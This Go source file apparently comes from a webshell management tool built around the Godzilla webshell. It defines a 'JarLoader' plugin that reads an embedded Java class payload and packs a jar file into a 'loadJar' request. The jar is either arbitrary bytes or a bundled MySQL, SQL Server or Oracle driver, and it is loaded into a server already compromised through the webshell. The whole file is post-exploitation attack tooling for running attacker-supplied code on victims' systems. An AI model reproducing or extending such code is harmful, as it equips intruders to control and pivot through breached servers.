package plugins

import (
	"fmt"
	"github.com/go0p/wsm/lib/payloads"
	"github.com/go0p/wsm/lib/shell/godzilla"
)

type DBDriver string

const (
	MysqlDriver     DBDriver = "godzilla/java/plugins/mysql.jar"
	SqlJdbc41Driver DBDriver = "godzilla/java/plugins/sqljdbc41.jar"
	Ojdbc5Driver    DBDriver = "godzilla/java/plugins/ojdbc5.jar"
)

type JarLoader struct {
	DBDriver       DBDriver
	JarFileContent []byte
}

func NewJarFileLoader(jarFileContent []byte) *JarLoader {
	return &JarLoader{JarFileContent: jarFileContent}
}

func NewJarDriverLoader(DBDriver DBDriver) *JarLoader {
	return &JarLoader{DBDriver: DBDriver}
}

func (j JarLoader) GetPluginName() (string, []byte, error) {
	binCode, err := payloads.GodClassPluginsFiles.ReadFile(fmt.Sprintf("godzilla/java/plugins/%s.class", "JarLoader"))

	if err != nil {
		return "", nil, err
	}
	return "plugin.JarLoader", binCode, nil
}

func (j JarLoader) GetParams() (string, *godzilla.Parameter) {
	reqParameter := godzilla.NewParameter()
	if len(j.DBDriver) != 0 {
		j.JarFileContent, _ = payloads.GodJarPluginsFiles.ReadFile(string(j.DBDriver))
	}
	reqParameter.AddBytes("jarByteArray", j.JarFileContent)

	return "loadJar", reqParameter
}
